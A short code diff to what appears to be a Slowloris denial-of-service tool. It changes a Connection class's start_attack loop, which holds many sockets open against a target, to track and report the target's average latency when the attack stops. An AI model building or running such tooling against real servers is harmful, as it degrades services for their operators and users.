@@ -53,7 +53,6 @@ class Connection:
     def start_attack(self):
         latence = latency.Latency(self.target_info)
         latence.start()
-        print("initial latency : {}".format(self.test_initial_latency(latence)))
 
         for _ in range(self.target_info.sockets_number):
             try:
@@ -82,9 +81,12 @@ class Connection:
                         print(e)
                         break
                 print("{} connections {} initialised".format(len(self.sockets_list),self.target_info.sockets_number))
-
+                if not latence.is_alive():
+                    latence.run()
                 time.sleep(15)
 
             except (KeyboardInterrupt, SystemExit):
                 print("Stopping Slowloris")
+                avg = latence.get_average()
+                print("Average latency = {}".format(avg))
                 break
